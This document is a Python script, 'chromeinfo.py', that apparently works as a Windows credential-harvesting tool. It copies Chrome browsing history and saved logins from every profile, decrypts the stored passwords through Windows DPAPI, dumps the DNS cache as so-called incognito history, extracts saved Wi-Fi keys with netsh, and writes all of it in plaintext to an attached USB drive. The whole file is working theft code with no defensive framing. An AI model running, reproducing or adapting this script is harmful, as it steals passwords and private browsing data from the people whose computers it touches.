# chromeinfo.py

import os
import sqlite3
import shutil
import string
import ctypes
import sys
import subprocess
from datetime import datetime, timedelta
import win32crypt
import re

# List of required packages
required_packages = [
    'pycryptodome',
    'pywin32'
]

def install(package):
    """Install a package using pip."""
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

def check_and_install_dependencies():
    """Check and install required dependencies."""
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"{package} is not installed. Installing...")
            install(package)
        else:
            print(f"{package} is already installed.")

def get_user_profile_dir():
    """Get the Chrome user profile directory."""
    user_profile_dir = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data")
    if not os.path.exists(user_profile_dir):
        raise FileNotFoundError(f"Chrome user data directory not found: {user_profile_dir}")
    return user_profile_dir

def get_profile_names(user_profile_dir):
    """Get the list of profile directories."""
    return [profile for profile in os.listdir(user_profile_dir) if os.path.isdir(os.path.join(user_profile_dir, profile))]

def get_chrome_history(user_profile_dir, profile_name):
    """Retrieve Chrome browsing history from the specified user profile directory."""
    history_db = os.path.join(user_profile_dir, profile_name, "History")
    
    if not os.path.exists(history_db):
        return []  # Return empty list if the history DB doesn't exist

    # Copy the database to avoid "database is locked" error
    temp_history_db = "temp_history.db"
    shutil.copy2(history_db, temp_history_db)

    conn = sqlite3.connect(temp_history_db)
    cursor = conn.cursor()

    # Query to retrieve normal browsing history data
    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls WHERE hidden = 0")
    history = cursor.fetchall()

    conn.close()
    os.remove(temp_history_db)  # Clean up the temporary database
    return history

def convert_chrome_time(chrome_time):
    """Convert Chrome's timestamp format to a readable datetime format."""
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)

def decrypt_password(encrypted_password):
    """Decrypt the password using Windows DPAPI."""
    try:
        return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
    except Exception as e:
        print(f"Failed to decrypt password: {e}")
        return None

def get_chrome_passwords(user_profile_dir, profile_name):
    """Retrieve saved passwords from Chrome."""
    login_db = os.path.join(user_profile_dir, profile_name, "Login Data")

    if not os.path.exists(login_db):
        print(f"No login database found for profile '{profile_name}'.")
        return []  # Return empty list if the login DB doesn't exist

    # Copy the database to avoid "database is locked" error
    temp_login_db = "temp_login.db"
    shutil.copy2(login_db, temp_login_db)

    conn = sqlite3.connect(temp_login_db)
    cursor = conn.cursor()

    # Query to retrieve saved passwords
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    passwords = cursor.fetchall()

    conn.close()
    os.remove(temp_login_db)  # Clean up the temporary database

    # Decrypt the passwords
    decrypted_passwords = []
    for origin_url, username, encrypted_password in passwords:
        decrypted_password = decrypt_password(encrypted_password)
        if decrypted_password is not None:
            decrypted_passwords.append((origin_url, username, decrypted_password.decode(errors='ignore')))
    
    return decrypted_passwords

def is_usb_drive(drive_letter):
    """Check if the given drive letter corresponds to a USB drive."""
    drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive_letter)
    return drive_type == 2  # DRIVE_REMOVABLE

def find_usb_drives():
    """Find all USB drives connected to the system."""
    usb_drives = []
    for letter in string.ascii_uppercase:
        drive_letter = f"{letter}:\\"
        if os.path.exists(drive_letter) and is_usb_drive(drive_letter):
            usb_drives.append(drive_letter)
    return usb_drives

def save_history_to_file(history, profile_name, usb_drive):
    """Save browsing history to a text file on the USB drive."""
    if not usb_drive:
        print("No USB drive found.")
        return

    history_folder = os.path.join(usb_drive, f"{profile_name}_normal_history")
    os.makedirs(history_folder, exist_ok=True)
    
    history_file_path = os.path.join(history_folder, "browsing_history.txt")
    
    try:
        with open(history_file_path, "w", encoding="utf-8") as f:
            f.write(f"=== Chrome Browsing History for Profile: {profile_name} ===\n\n")
            for url, title, visit_count, last_visit_time in history:
                readable_time = convert_chrome_time(last_visit_time)
                f.write(f"URL: {url}\nTitle: {title}\nVisits: {visit_count}\nLast Visit: {readable_time}\n\n")
        
        print(f"History for profile '{profile_name}' saved to {history_file_path}")

    except Exception as e:
        print(f"Failed to save history to file: {e}")

def save_passwords_to_file(passwords, profile_name, usb_drive):
    """Save passwords to a text file on the USB drive."""
    if not usb_drive:
        print("No USB drive found.")
        return

    password_folder = os.path.join(usb_drive, f"{profile_name}_normal_passwords")
    os.makedirs(password_folder, exist_ok=True)
    
    password_file_path = os.path.join(password_folder, "saved_passwords.txt")
    
    try:
        with open(password_file_path, "w", encoding="utf-8") as f:
            f.write(f"=== Chrome Saved Passwords for Profile: {profile_name} ===\n\n")
            if not passwords:
                f.write("No saved passwords found.\n")
            for origin_url, username, password in passwords:
                f.write(f"Website: {origin_url}\nUsername: {username}\nPassword: {password}\n\n")

        print(f"Passwords for profile '{profile_name}' saved to {password_file_path}")

    except Exception as e:
        print(f"Failed to save passwords to file: {e}")

def get_incognito_history():
    """Retrieve incognito history using the DNS cache."""
    try:
        # Run the command to get the DNS cache
        output = subprocess.check_output("ipconfig /displaydns", shell=True, text=True)
        return output
    except Exception as e:
        print(f"Failed to get incognito history: {e}")
        return None

def gather_incognito_data(usb_drive):
    """Gather incognito history and passwords."""
    incognito_history = get_incognito_history()
    
    if incognito_history:
        incognito_folder = os.path.join(usb_drive, "incognito_data")
        os.makedirs(incognito_folder, exist_ok=True)

        incognito_history_file_path = os.path.join(incognito_folder, "incognito_history.txt")
        try:
            with open(incognito_history_file_path, "w", encoding="utf-8") as f:
                f.write(incognito_history)
            print(f"Incognito history saved to {incognito_history_file_path}")
        except Exception as e:
            print(f"Failed to save incognito history to file: {e}")

def gather_network_info():
    """Gather network information and saved Wi-Fi passwords."""
    network_info = {}
    
    # Get current network information
    try:
        ipconfig_output = subprocess.check_output("ipconfig", text=True)
        network_info['ipconfig'] = ipconfig_output
    except Exception as e:
        print(f"Failed to gather network information: {e}")

    # Get Wi-Fi network passwords
    try:
        wifi_passwords = subprocess.check_output("netsh wlan show profiles", text=True)
        network_info['wifi_profiles'] = wifi_passwords
    except Exception as e:
        print(f"Failed to gather Wi-Fi profiles: {e}")

    # Extract Wi-Fi passwords
    wifi_details = {}
    profiles = re.findall(r'Profile\s*:\s*(.*)', network_info['wifi_profiles'])
    for profile in profiles:
        try:
            password_info = subprocess.check_output(f"netsh wlan show profile \"{profile}\" key=clear", text=True)
            password = re.search(r'Key Content\s*:\s*(.*)', password_info)
            if password:
                wifi_details[profile] = password.group(1).strip()
            else:
                wifi_details[profile] = "No password found"
        except Exception as e:
            print(f"Failed to gather password for {profile}: {e}")

    network_info['wifi_passwords'] = wifi_details
    return network_info

def save_network_info_to_file(network_info, usb_drive):
    """Save network information and Wi-Fi passwords to text files on the USB drive."""
    if not usb_drive:
        print("No USB drive found.")
        return

    # Save network information
    network_folder = os.path.join(usb_drive, "network_info")
    os.makedirs(network_folder, exist_ok=True)

    network_file_path = os.path.join(network_folder, "network_info.txt")
    wifi_file_path = os.path.join(network_folder, "wifi_passwords.txt")

    try:
        with open(network_file_path, "w", encoding="utf-8") as f:
            f.write("=== Network Information ===\n\n")
            f.write(network_info['ipconfig'])
        
        print(f"Network information saved to {network_file_path}")

        with open(wifi_file_path, "w", encoding="utf-8") as f:
            f.write("=== Wi-Fi Passwords ===\n\n")
            for profile, password in network_info['wifi_passwords'].items():
                f.write(f"Profile: {profile}\nPassword: {password}\n\n")

        print(f"Wi-Fi passwords saved to {wifi_file_path}")

    except Exception as e:
        print(f"Failed to save network information to file: {e}")

def main():
    check_and_install_dependencies()

    user_profile_dir = get_user_profile_dir()
    profiles = get_profile_names(user_profile_dir)
    usb_drives = find_usb_drives()

    if not usb_drives:
        print("No USB drives found. Please connect a USB drive.")
        return

    # Using the first USB drive found for saving data
    usb_drive = usb_drives[0]

    # Create folders for normal and incognito data
    normal_folder = os.path.join(usb_drive, "normal_data")
    os.makedirs(normal_folder, exist_ok=True)

    incognito_folder = os.path.join(usb_drive, "incognito_data")
    os.makedirs(incognito_folder, exist_ok=True)

    for profile_name in profiles:
        history = get_chrome_history(user_profile_dir, profile_name)
        save_history_to_file(history, profile_name, normal_folder)

        passwords = get_chrome_passwords(user_profile_dir, profile_name)
        save_passwords_to_file(passwords, profile_name, normal_folder)

    # Gather incognito data
    gather_incognito_data(incognito_folder)

    # Gather network information and Wi-Fi passwords
    network_info = gather_network_info()
    save_network_info_to_file(network_info, usb_drive)

if __name__ == "__main__":
    main()


